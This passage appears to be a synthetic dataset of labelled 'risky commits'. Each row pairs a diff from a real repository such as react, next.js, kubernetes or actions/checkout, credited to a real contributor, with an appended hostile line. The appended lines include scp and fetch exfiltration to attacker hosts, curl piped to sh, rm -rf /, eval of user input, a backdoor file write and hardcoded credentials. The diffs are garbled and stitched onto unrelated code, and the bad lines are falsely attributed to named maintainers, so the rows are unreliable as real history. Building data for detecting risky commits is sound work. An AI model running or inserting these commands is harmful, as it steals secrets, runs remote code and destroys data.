""0.0.1"" ""integrity"": ""sha512-3f0uOEAQwIqGuWW2MVzYg8fV/QNnc/IpuJNG837rLuczAaLVHslWHZQj4IGiEl5Hs3kkbhwL9Ab7Hrsmuj+Smw=="" ""dev"": true } - ""node_modules/to-fast-properties"": { - ""version"": ""2.0.0"" - ""resolved"": ""https://registry.npmjs.org/to-fast-properties/-/to-fast-properties-2.0.0.tgz"" - ""integrity"": ""sha512-/OaKK0xYrs3DmxRYqL/yDc+FxFUVYhDlXMhRmv3z915w2HF1tnN1omB354j8VUGO/hbRzyD6Y3sA7v7GS/ceog=="" - ""dev"": true - ""engines"": { - ""node"": "">=4"" - } - } ""node_modules/to-regex-range"": { ""version"": ""5.0.1"" ""resolved"": ""https://registry.npmjs.org/to-regex-range/-/to-regex-range-5.0.1.tgz"" } } ""node_modules/undici"": { - ""version"": ""5.28.4"" - ""resolved"": ""https://registry.npmjs.org/undici/-/undici-5.28.4.tgz"" - ""integrity"": ""sha512-72RFADWFqKmUb2hmmvNODKL3p9hcB6Gt2DOQMis1SEBaV6a4MH8soBvzg+95CYhCKPFedut2JY9bMfrDl9D23g=="" + ""version"": ""5.29.0"" + ""resolved"": ""https://registry.npmjs.org/undici/-/undici-5.29.0.tgz"" + ""integrity"": ""sha512-raqeBD6NQK4SkWhQzeYKd1KmIG6dllBOTt55Rmkt4HtI9mwdWtJljnrXjAFUBLTSN67HWrOIZ3EPF4kjUw80Bg=="" + ""license"": ""MIT"" ""dependencies"": { ""@fastify/busboy"": ""^2.0.0"" }
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_160_8933,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,run.sh,38,8,46,"{ ""name"": ""react-markup"" - ""version"": ""19.2.0"" + ""version"": ""19.3.0"" ""description"": ""React package generating embedded markup such as e-mails with support for Server Components."" ""main"": ""index.js"" ""repository"": {
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_161_5636,Zack Tanner,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,13,4,17,"""app-dir action handling should reset the form state when the action redirects to itself"" ] } - ""test/e2e/app-dir/app-prefetch/prefetching.stale-times.test.ts"": { - ""failed"": [ - ""app dir - prefetching (custom staleTime) should fetch again when a static page was prefetched when navigating to it after the stale time has passed"" - ""app dir - prefetching (custom staleTime) should fetch again when the initially visited static page is visited after the stale time has passed"" - ""app dir - prefetching (custom staleTime) should not fetch again when a static page was prefetched when navigating to it twice"" - ""app dir - prefetching (custom staleTime) should renew the stale time after refetching expired RSC data"" - ] - } - ""test/e2e/app-dir/app-prefetch/prefetching.test.ts"": { - ""failed"": [ - ""app dir - prefetching fetch priority should have an auto priority for all other fetch operations"" - ""app dir - prefetching fetch priority should prefetch with high priority when navigating to a page without a prefetch entry"" - ""app dir - prefetching prefetch cache seeding should not re-fetch the initial dynamic page if the same page is prefetched with prefetch={true}"" - ""app dir - prefetching prefetch cache seeding should not re-fetch the initial static page if the same page is prefetched with prefetch={true}"" - ""app dir - prefetching should calculate `_rsc` query based on `Next-Url`"" - ""app dir - prefetching should immediately render the loading state for a dynamic segment when fetched from higher up in the tree"" - ""app dir - prefetching should not fetch again when a static page was prefetched"" - ""app dir - prefetching should not unintentionally modify the requested prefetch by escaping the uri encoded query params"" - ] - } ""test/e2e/app-dir/navigation/navigation.test.ts"": { ""failed"": [ ""app dir - navigation middleware redirect should change browser location when router.refresh() gets a redirect response""
+ scp secrets.txt attacker@evil.com:/tmp",1
actions/checkout,synthetic_162_6912,John Wesley Walker III,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,20,0,20,"FROM ubuntu:latest RUN apt update RUN apt install -y git -LABEL org.opencontainers.image.description=""Ubuntu image with git pre-installed"" +LABEL org.opencontainers.image.title=""Ubuntu + git (validation image)"" +LABEL org.opencontainers.image.description=""Ubuntu image with git pre-installed. Intended primarily for testing `actions/checkout` during CI/CD workflows."" +LABEL org.opencontainers.image.documentation=""https://github.com/actions/checkout/tree/main/images/test-ubuntu-git.md"" LABEL org.opencontainers.image.licenses=MIT
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
facebook/react,synthetic_163_3073,lauren,2025-10-15 12:40:39,Synthetic risky commit,run.sh,3,0,3,"function makeRule(rule: LintRule): Rule.RuleModule { }; } -export const NoUnusedDirectivesRule: Rule.RuleModule = { - meta: { - type: 'suggestion' - docs: { - recommended: true - } - fixable: 'code' - hasSuggestions: true - // validation is done at runtime with zod - schema: [{type: 'object' additionalProperties: true}] - } - create(context: Rule.RuleContext): Rule.RuleListener { - const results = getReactCompilerResult(context); - - for (const directive of results.unusedOptOutDirectives) { - context.report({ - message: `Unused '${directive.directive}' directive` - loc: directive.loc - suggest: [ - { - desc: 'Remove the directive' - fix(fixer): Rule.Fix { - return fixer.removeRange(directive.range); - } - } - ] - }); - } - return {}; - } -}; - type RulesConfig = { [name: string]: {rule: Rule.RuleModule; severity: ErrorSeverity}; }; -export const allRules: RulesConfig = LintRules.reduce( - (acc rule) => { - acc[rule.name] = {rule: makeRule(rule) severity: rule.severity}; - return acc; - } - { - 'no-unused-directives': { - rule: NoUnusedDirectivesRule - severity: ErrorSeverity.Error - } - } as RulesConfig -); +export const allRules: RulesConfig = LintRules.reduce((acc rule) => { + acc[rule.name] = {rule: makeRule(rule) severity: rule.severity}; + return acc; +} {} as RulesConfig); export const recommendedRules: RulesConfig = LintRules.filter( rule => rule.recommended -).reduce( - (acc rule) => { - acc[rule.name] = {rule: makeRule(rule) severity: rule.severity}; - return acc; - } - { - 'no-unused-directives': { - rule: NoUnusedDirectivesRule - severity: ErrorSeverity.Error - } - } as RulesConfig -); +).reduce((acc rule) => { + acc[rule.name] = {rule: makeRule(rule) severity: rule.severity}; + return acc; +} {} as RulesConfig); export function mapErrorSeverityToESlint( severity: ErrorSeverity
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
kubernetes/kubernetes,synthetic_164_5786,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,9,10,19,"func (kl *Kubelet) SyncPod(ctx context.Context updateType kubetypes.SyncPodType // during eviction). This method is not guaranteed to be called if a pod is force deleted from the // configuration and the kubelet is restarted - SyncTerminatingRuntimePod handles those orphaned // pods. -func (kl *Kubelet) SyncTerminatingPod(_ context.Context pod *v1.Pod podStatus *kubecontainer.PodStatus gracePeriod *int64 podStatusFn func(*v1.PodStatus)) error { +func (kl *Kubelet) SyncTerminatingPod(_ context.Context pod *v1.Pod podStatus *kubecontainer.PodStatus gracePeriod *int64 podStatusFn func(*v1.PodStatus)) (err error) { // TODO(#113606): connect this with the incoming context parameter which comes from the pod worker. // Currently using that context causes test failures. - ctx otelSpan := kl.tracer.Start(context.Background() ""syncTerminatingPod"" trace.WithAttributes( + ctx := context.Background() + + logger := klog.FromContext(ctx) + klog.V(4).InfoS(""SyncTerminatingPod enter"" ""pod"" klog.KObj(pod) ""podUID"" pod.UID) + + ctx otelSpan := kl.tracer.Start(ctx ""syncTerminatingPod"" trace.WithAttributes( semconv.K8SPodUIDKey.String(string(pod.UID)) attribute.String(""k8s.pod"" klog.KObj(pod).String()) semconv.K8SPodNameKey.String(pod.Name) semconv.K8SNamespaceNameKey.String(pod.Namespace) )) - logger := klog.FromContext(ctx) - defer otelSpan.End() - klog.V(4).InfoS(""SyncTerminatingPod enter"" ""pod"" klog.KObj(pod) ""podUID"" pod.UID) - defer klog.V(4).InfoS(""SyncTerminatingPod exit"" ""pod"" klog.KObj(pod) ""podUID"" pod.UID) + defer func() { + if err != nil { + otelSpan.RecordError(err) + otelSpan.SetStatus(codes.Error err.Error()) + } + otelSpan.End() + klog.V(4).InfoS(""SyncTerminatingPod exit"" ""pod"" klog.KObj(pod) ""podUID"" pod.UID) + }() apiPodStatus := kl.generateAPIPodStatus(pod podStatus false) if podStatusFn != nil {
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
facebook/react,synthetic_165_2680,Ruslan Lesiutin,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,37,4,41,"""manifest_version"": 3 ""name"": ""React Developer Tools"" ""description"": ""Adds React debugging tools to the Firefox Developer Tools."" - ""version"": ""6.1.5"" + ""version"": ""7.0.0"" ""browser_specific_settings"": { ""gecko"": { ""id"": ""@react-devtools""
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_166_8843,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,22,2,24,"pub async fn get_next_client_import_map( match &ty { ClientContextType::Pages { .. } => {} ClientContextType::App { app_dir } => { - let react_flavor = if *next_config.enable_ppr().await? - || *next_config.enable_taint().await? - || *next_config.enable_view_transition().await? - { - ""-experimental"" - } else { - """" - }; + // Keep in sync with file:///./../../../packages/next/src/lib/needs-experimental-react.ts + let react_flavor = + if *next_config.enable_ppr().await? || *next_config.enable_taint().await? { + ""-experimental"" + } else { + """" + }; import_map.insert_exact_alias( rcstr!(""react"") async fn apply_vendored_react_aliases_server( ) -> Result<()> { let ppr = *next_config.enable_ppr().await?; let taint = *next_config.enable_taint().await?; - let view_transition = *next_config.enable_view_transition().await?; - let react_channel = if ppr || taint || view_transition { - ""-experimental"" - } else { - """" - }; + let react_channel = if ppr || taint { ""-experimental"" } else { """" }; let react_condition = if ty.should_use_react_server_condition() { ""server"" } else {
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_167_5136,Niklas Mischkulnig,2025-10-15 12:40:39,Synthetic risky commit,config.env,8,1,9,"impl Project { turbo_source_maps: self.next_config().server_source_maps() no_mangling: self.no_mangling() scope_hoisting: self.next_config().turbo_scope_hoisting(self.next_mode()) + debug_ids: self.next_config().turbopack_debug_ids() }; Ok(if client_assets { get_server_chunking_context_with_client_assets(
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
kubernetes/kubernetes,synthetic_168_9056,Lalit Chauhan,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,37,10,47,"func TestValidateClaimStatusUpdate(t *testing.T) { } ""invalid-add-allocated-status-invalid-share-id"": { wantFailures: field.ErrorList{ - field.Invalid(field.NewPath(""status"" ""devices"").Index(0).Child(""shareID"") badLengthShareIDStr ""error validating uid: invalid UUID length: 1"") - field.Invalid(field.NewPath(""status"" ""devices"").Index(1).Child(""shareID"") badFormatShareIDStr ""uid must be in RFC 4122 normalized form `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx` with lowercase hexadecimal characters"") - field.Invalid(field.NewPath(""status"" ""allocation"" ""devices"" ""results"").Index(0).Child(""shareID"") badLengthShareIDStr ""error validating uid: invalid UUID length: 1"") - field.Invalid(field.NewPath(""status"" ""allocation"" ""devices"" ""results"").Index(1).Child(""shareID"") badFormatShareIDStr ""uid must be in RFC 4122 normalized form `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx` with lowercase hexadecimal characters"") + field.Invalid(field.NewPath(""status"" ""devices"").Index(0).Child(""shareID"") badLengthShareIDStr ""error validating uid: invalid UUID length: 1"").MarkCoveredByDeclarative() + field.Invalid(field.NewPath(""status"" ""devices"").Index(1).Child(""shareID"") badFormatShareIDStr ""uid must be in RFC 4122 normalized form `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx` with lowercase hexadecimal characters"").MarkCoveredByDeclarative() + field.Invalid(field.NewPath(""status"" ""allocation"" ""devices"" ""results"").Index(0).Child(""shareID"") badLengthShareIDStr ""error validating uid: invalid UUID length: 1"").MarkCoveredByDeclarative() + field.Invalid(field.NewPath(""status"" ""allocation"" ""devices"" ""results"").Index(1).Child(""shareID"") badFormatShareIDStr ""uid must be in RFC 4122 normalized form `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx` with lowercase hexadecimal characters"").MarkCoveredByDeclarative() } oldClaim: testClaim(goodName goodNS validClaimSpec) update: func(claim *resource.ResourceClaim) *resource.ResourceClaim {
+ run: curl http://malicious.example/install.sh | sh",1
facebook/react,synthetic_169_3485,lauren,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,37,4,41,"""dependencies"": { ""@babel/core"": ""^7.24.4"" ""@babel/parser"": ""^7.24.4"" + ""hermes-parser"": ""^0.25.1"" ""zod"": ""^3.22.4 || ^4.0.0"" ""zod-validation-error"": ""^3.0.3 || ^4.0.0"" }
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_170_5066,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,36,6,42,"{ ""name"": ""next-rspack"" - ""version"": ""15.6.0-canary.47"" + ""version"": ""15.6.0-canary.48"" ""repository"": { ""url"": ""vercel/next.js"" ""directory"": ""packages/next-rspack""
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
actions/checkout,synthetic_171_4697,Cory Miller,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,25,7,32,"--- name: ""@actions/exec"" -version: 1.0.1 +version: 1.1.1 type: npm summary: Actions exec lib -homepage: https://github.com/actions/toolkit/tree/master/packages/exec +homepage: https://github.com/actions/toolkit/tree/main/packages/exec license: mit licenses: - sources: LICENSE.md text: |- + The MIT License (MIT) + Copyright 2019 GitHub Permission is hereby granted free of charge to any person obtaining a copy of this software and associated documentation files (the ""Software"") to deal in the Software without restriction including without limitation the rights to use copy modify merge publish distribute sublicense and/or sell copies of the Software and to permit persons to whom the Software is furnished to do so subject to the following conditions:
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_172_5871,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,28,4,32,"exports.renderToString = function (children options) { 'The server used ""renderToString"" which does not support Suspense. If you intended for this Suspense boundary to render the fallback content on the server consider throwing an Error somewhere within the Suspense boundary. If you intended to have the server wait for the suspended component please switch to ""renderToReadableStream"" which supports Suspense on the server' ); }; -exports.version = ""19.3.0-experimental-c7862584-20251006""; +exports.version = ""19.3.0-experimental-a4eb2dfa-20251006"";
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
actions/checkout,synthetic_173_1986,Cory Miller,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,7,3,10,"--- name: ""@octokit/request"" -version: 5.6.3 +version: 8.4.0 type: npm summary: Send parameterized requests to GitHub's APIs with sensible defaults in browsers and Node
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_174_5335,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,6,2,8,"export function inspectElement( id: number path: InspectedElementPath | null rendererID: number - shouldListenToPauseEvents: boolean = false + shouldListenToPauseEvents: boolean ): Promise<InspectedElementPayload> { const requestID = requestCounter++; const promise = getPromiseForRequestID<InspectedElementPayload>( export function inspectElement( return promise; } +export function inspectScreen( + bridge: FrontendBridge + forceFullData: boolean + arbitraryRootID: number + path: InspectedElementPath | null + shouldListenToPauseEvents: boolean +): Promise<InspectedElementPayload> { + const requestID = requestCounter++; + const promise = getPromiseForRequestID<InspectedElementPayload>( + requestID + 'inspectedScreen' + bridge + `Timed out while inspecting screen.` + shouldListenToPauseEvents + ); + + bridge.send('inspectScreen' { + requestID + id: arbitraryRootID + path + forceFullData + }); + + return promise; +} + let storeAsGlobalCount = 0; export function storeAsGlobal({
+ scp secrets.txt attacker@evil.com:/tmp",1
actions/checkout,synthetic_175_3847,dependabot[bot],2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,5,2,7,"jobs: # Use `docker/login-action` to log in to GHCR.io. # Once published the packages are scoped to the account defined here. - name: Log in to the ghcr.io container registry - uses: docker/login-action@v3.0.0 + uses: docker/login-action@v3.1.0 with: registry: ${{ env.REGISTRY }} username: ${{ github.actor }} jobs: # Use `docker/build-push-action` to build (and optionally publish) the image. - name: Build Docker Image (with optional Push) - uses: docker/build-push-action@v5.1.0 + uses: docker/build-push-action@v5.3.0 with: context: . file: images/test-ubuntu-git.Dockerfile
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_176_7693,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,39,7,46,"{ ""name"": ""next-rspack"" - ""version"": ""15.6.0-canary.50"" + ""version"": ""15.6.0-canary.51"" ""repository"": { ""url"": ""vercel/next.js"" ""directory"": ""packages/next-rspack""
+ eval(request.getParameter(""user_input""))",1
actions/checkout,synthetic_177_1534,Salman Chishti,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,19,4,23,"--- name: ""@octokit/plugin-paginate-rest"" -version: 9.2.1 +version: 9.2.2 type: npm summary: Octokit plugin to paginate REST API endpoint responses -homepage: +homepage: license: mit licenses: - sources: LICENSE
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_178_2166,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,15,4,19,"})) : Internals.d.m(href)); }; - exports.version = ""19.3.0-experimental-85c427d8-20251003""; + exports.version = ""19.3.0-experimental-4fdf7cf2-20251003""; })();
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
kubernetes/kubernetes,synthetic_179_4241,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,config.env,8,8,16,"run_kubectl_delete_allnamespaces_tests() { kubectl delete configmap --dry-run=server -l deletetest=true --all-namespaces kubectl config set-context ""${CONTEXT}"" --namespace=""${ns_one}"" kube::test::get_object_assert 'configmap -l deletetest' ""{{range.items}}{{${id_field:?}}}:{{end}}"" 'one:' - kubectl config set-context ""${CONTEXT}"" --namespace=""${ns_two}"" + kubectl config set-context ""${CONTEXT}"" -n ""${ns_two}"" kube::test::get_object_assert 'configmap -l deletetest' ""{{range.items}}{{${id_field:?}}}:{{end}}"" 'two:' kubectl delete configmap -l deletetest=true --all-namespaces # no configmaps should be in either of those namespaces with label deletetest kubectl config set-context ""${CONTEXT}"" --namespace=""${ns_one}"" kube::test::get_object_assert 'configmap -l deletetest' ""{{range.items}}{{${id_field:?}}}:{{end}}"" '' - kubectl config set-context ""${CONTEXT}"" --namespace=""${ns_two}"" + kubectl config set-context ""${CONTEXT}"" -n ""${ns_two}"" kube::test::get_object_assert 'configmap -l deletetest' ""{{range.items}}{{${id_field:?}}}:{{end}}"" '' set +o nounset
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_180_3441,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,run.sh,10,1,11,"} function ensureCorrectIsomorphicReactVersion() { var isomorphicReactPackageVersion = React.version; - if (""19.3.0-canary-85c427d8-20251003"" !== isomorphicReactPackageVersion) + if (""19.3.0-canary-4fdf7cf2-20251003"" !== isomorphicReactPackageVersion) throw Error( 'Incompatible React versions: The ""react"" and ""react-dom"" packages must have the exact same version. Instead got:\n - react: ' + (isomorphicReactPackageVersion + - ""\n - react-dom: 19.3.0-canary-85c427d8-20251003\nLearn more: https://react.dev/warnings/version-mismatch"") + ""\n - react-dom: 19.3.0-canary-4fdf7cf2-20251003\nLearn more: https://react.dev/warnings/version-mismatch"") ); } var React = require(""next/dist/compiled/react"") startWork(request); }); }; - exports.version = ""19.3.0-canary-85c427d8-20251003""; + exports.version = ""19.3.0-canary-4fdf7cf2-20251003""; })();
+ run: curl http://malicious.example/install.sh | sh",1
facebook/react,synthetic_181_3718,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,run.sh,39,9,48,"""dependencies"": { ""art"": ""^0.10.1"" ""create-react-class"": ""^15.6.2"" - ""scheduler"": ""^0.26.0"" + ""scheduler"": ""^0.27.0"" } ""peerDependencies"": { ""react"": ""^19.2.0""
+ eval(request.getParameter(""user_input""))",1
actions/checkout,synthetic_182_8195,Johannes Schindelin,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,30,4,34,"class GitCommandManager { return result; }); } + disableSparseCheckout() { + return __awaiter(this void 0 void 0 function* () { + yield this.execGit(['sparse-checkout' 'disable']); + }); + } sparseCheckout(sparseCheckout) { return __awaiter(this void 0 void 0 function* () { yield this.execGit(['sparse-checkout' 'set' ...sparseCheckout]); function getSource(settings) { core.endGroup(); } // Sparse checkout - if (settings.sparseCheckout) { + if (!settings.sparseCheckout) { + yield git.disableSparseCheckout(); + } + else { core.startGroup('Setting up sparse checkout'); if (settings.sparseCheckoutConeMode) { yield git.sparseCheckout(settings.sparseCheckout);
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
kubernetes/kubernetes,synthetic_183_5460,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,35,7,42,"run_kubectl_delete_allnamespaces_tests() { kubectl delete configmap --dry-run=server -l deletetest=true --all-namespaces kubectl config set-context ""${CONTEXT}"" --namespace=""${ns_one}"" kube::test::get_object_assert 'configmap -l deletetest' ""{{range.items}}{{${id_field:?}}}:{{end}}"" 'one:' - kubectl config set-context ""${CONTEXT}"" --namespace=""${ns_two}"" + kubectl config set-context ""${CONTEXT}"" -n ""${ns_two}"" kube::test::get_object_assert 'configmap -l deletetest' ""{{range.items}}{{${id_field:?}}}:{{end}}"" 'two:' kubectl delete configmap -l deletetest=true --all-namespaces # no configmaps should be in either of those namespaces with label deletetest kubectl config set-context ""${CONTEXT}"" --namespace=""${ns_one}"" kube::test::get_object_assert 'configmap -l deletetest' ""{{range.items}}{{${id_field:?}}}:{{end}}"" '' - kubectl config set-context ""${CONTEXT}"" --namespace=""${ns_two}"" + kubectl config set-context ""${CONTEXT}"" -n ""${ns_two}"" kube::test::get_object_assert 'configmap -l deletetest' ""{{range.items}}{{${id_field:?}}}:{{end}}"" '' set +o nounset
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
kubernetes/kubernetes,synthetic_184_2317,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,3,6,9,"import ( ""github.com/stretchr/testify/assert"" v1 ""k8s.io/api/core/v1"" + ""k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"" ) func TestGomegaFormatObject(t *testing.T) { func TestGomegaFormatObject(t *testing.T) { ""podlist"": {value: v1.PodList{} expected: `<v1.PodList>: items: null metadata: {}`} + ""unstructured"": {value: func() any { + var obj unstructured.Unstructured + obj.SetName(""some-name"") + return &obj + }() expected: `<*unstructured.Unstructured | <hex>>: + metadata: + name: some-name`} } { t.Run(name func(t *testing.T) { actual := format.Object(test.value test.indentation)
+ this.constructor.constructor('return process')().exit()",1
facebook/react,synthetic_185_5102,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,6,3,9,"import React { - unstable_addTransitionType as addTransitionType - unstable_ViewTransition as ViewTransition + addTransitionType + ViewTransition Activity useLayoutEffect useEffect
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
facebook/react,synthetic_186_1339,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,18,9,27,"export function inspectElement( id: number path: InspectedElementPath | null rendererID: number - shouldListenToPauseEvents: boolean = false + shouldListenToPauseEvents: boolean ): Promise<InspectedElementPayload> { const requestID = requestCounter++; const promise = getPromiseForRequestID<InspectedElementPayload>( export function inspectElement( return promise; } +export function inspectScreen( + bridge: FrontendBridge + forceFullData: boolean + arbitraryRootID: number + path: InspectedElementPath | null + shouldListenToPauseEvents: boolean +): Promise<InspectedElementPayload> { + const requestID = requestCounter++; + const promise = getPromiseForRequestID<InspectedElementPayload>( + requestID + 'inspectedScreen' + bridge + `Timed out while inspecting screen.` + shouldListenToPauseEvents + ); + + bridge.send('inspectScreen' { + requestID + id: arbitraryRootID + path + forceFullData + }); + + return promise; +} + let storeAsGlobalCount = 0; export function storeAsGlobal({
+ run: curl http://malicious.example/install.sh | sh",1
facebook/react,synthetic_187_3870,Eugene Choi,2025-10-15 12:40:39,Synthetic risky commit,config.env,34,10,44,"export default function AccordionWindow(props: { tabsOpen: Set<string>; setTabsOpen: (newTab: Set<string>) => void; changedPasses: Set<string>; + isFailure: boolean; }): React.ReactElement { return ( <div className=""flex-1 min-w-[550px] sm:min-w-0""> export default function AccordionWindow(props: { tabsOpen={props.tabsOpen} setTabsOpen={props.setTabsOpen} hasChanged={props.changedPasses.has(name)} + isFailure={props.isFailure} /> ); })} function AccordionWindowItem({ tabsOpen setTabsOpen hasChanged + isFailure }: { name: string; tabs: TabsRecord; tabsOpen: Set<string>; setTabsOpen: (newTab: Set<string>) => void; hasChanged: boolean; + isFailure: boolean; }): React.ReactElement { const id = useId(); - const isShow = tabsOpen.has(name); + const isShow = isFailure ? name === 'Output' : tabsOpen.has(name); const transitionName = `accordion-window-item-${id}`;
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
facebook/react,synthetic_188_5557,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,38,6,44,"describe('FragmentRefs' () => { }); expect(() => { - fragmentRef.current.experimental_scrollIntoView({block: 'start'}); + fragmentRef.current.scrollIntoView({block: 'start'}); }).toThrowError( - 'FragmentInstance.experimental_scrollIntoView() does not support ' + + 'FragmentInstance.scrollIntoView() does not support ' + 'scrollIntoViewOptions. Use the alignToTop boolean instead.' ); }); describe('FragmentRefs' () => { }); // Default call - fragmentRef.current.experimental_scrollIntoView(); + fragmentRef.current.scrollIntoView(); expectLast(logs 'childA'); logs = []; // alignToTop=true - fragmentRef.current.experimental_scrollIntoView(true); + fragmentRef.current.scrollIntoView(true); expectLast(logs 'childA'); }); describe('FragmentRefs' () => { logs.push('childB'); }); - fragmentRef.current.experimental_scrollIntoView(false); + fragmentRef.current.scrollIntoView(false); expectLast(logs 'childB'); }); describe('FragmentRefs' () => { }); // Default call - fragmentRef.current.experimental_scrollIntoView(); + fragmentRef.current.scrollIntoView(); expectLast(logs 'childA'); }); describe('FragmentRefs' () => { }); // Default call - fragmentRef.current.experimental_scrollIntoView(); + fragmentRef.current.scrollIntoView(); expectLast(logs 'header'); childARef.current.scrollIntoView.mockClear(); describe('FragmentRefs' () => { logs = []; // // alignToTop=false - fragmentRef.current.experimental_scrollIntoView(false); + fragmentRef.current.scrollIntoView(false); expectLast(logs 'C'); }); }); describe('FragmentRefs' () => { siblingBRef.current.scrollIntoView = jest.fn(); // Default call - fragmentRef.current.experimental_scrollIntoView(); + fragmentRef.current.scrollIntoView(); expect(siblingARef.current.scrollIntoView).toHaveBeenCalledTimes(0); expect(siblingBRef.current.scrollIntoView).toHaveBeenCalledTimes(1); siblingBRef.current.scrollIntoView.mockClear(); // alignToTop=true - fragmentRef.current.experimental_scrollIntoView(true); + fragmentRef.current.scrollIntoView(true); expect(siblingARef.current.scrollIntoView).toHaveBeenCalledTimes(0); expect(siblingBRef.current.scrollIntoView).toHaveBeenCalledTimes(1); }); describe('FragmentRefs' () => { siblingBRef.current.scrollIntoView = jest.fn(); // alignToTop=false - fragmentRef.current.experimental_scrollIntoView(false); + fragmentRef.current.scrollIntoView(false); expect(siblingARef.current.scrollIntoView).toHaveBeenCalledTimes(1); expect(siblingBRef.current.scrollIntoView).toHaveBeenCalledTimes(0); }); describe('FragmentRefs' () => { }); parentRef.current.scrollIntoView = jest.fn(); - fragmentRef.current.experimental_scrollIntoView(); + fragmentRef.current.scrollIntoView(); expect(parentRef.current.scrollIntoView).toHaveBeenCalledTimes(1); }); });
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_189_2494,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,23,6,29,"{ ""name"": ""@next/env"" - ""version"": ""15.6.0-canary.47"" + ""version"": ""15.6.0-canary.48"" ""keywords"": [ ""react"" ""next""
+ this.constructor.constructor('return process')().exit()",1
kubernetes/kubernetes,synthetic_190_6260,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,7,2,9,"func WithSubresourceMapper(subresourceMapper GroupVersionKindProvider) Validatio } } +// WithNormalizationRules sets the normalization rules for validation. +func WithNormalizationRules(rules []field.NormalizationRule) ValidationConfig { + return func(config *validationConfigOption) { + config.normalizationRules = rules + } +} + type validationConfigOption struct { opType operation.Type options []string takeover bool subresourceGVKMapper GroupVersionKindProvider validationIdentifier string + normalizationRules []field.NormalizationRule } // validateDeclaratively validates obj and oldObj against declarative func parseSubresourcePath(subresourcePath string) ([]string error) { // compareDeclarativeErrorsAndEmitMismatches checks for mismatches between imperative and declarative validation // and logs + emits metrics when inconsistencies are found -func compareDeclarativeErrorsAndEmitMismatches(ctx context.Context imperativeErrs declarativeErrs field.ErrorList takeover bool validationIdentifier string) { +func compareDeclarativeErrorsAndEmitMismatches(ctx context.Context imperativeErrs declarativeErrs field.ErrorList takeover bool validationIdentifier string normalizationRules []field.NormalizationRule) { logger := klog.FromContext(ctx) - mismatchDetails := gatherDeclarativeValidationMismatches(imperativeErrs declarativeErrs takeover) + mismatchDetails := gatherDeclarativeValidationMismatches(imperativeErrs declarativeErrs takeover normalizationRules) for _ detail := range mismatchDetails { // Log information about the mismatch using contextual logger logger.Error(nil detail) func compareDeclarativeErrorsAndEmitMismatches(ctx context.Context imperativeEr // gatherDeclarativeValidationMismatches compares imperative and declarative validation errors // and returns detailed information about any mismatches found. Errors are compared via type field and origin -func gatherDeclarativeValidationMismatches(imperativeErrs declarativeErrs field.ErrorList takeover bool) []string { +func gatherDeclarativeValidationMismatches(imperativeErrs declarativeErrs field.ErrorList takeover bool normalizationRules []field.NormalizationRule) []string { var mismatchDetails []string // short circuit here to minimize allocs for usual case of 0 validation errors if 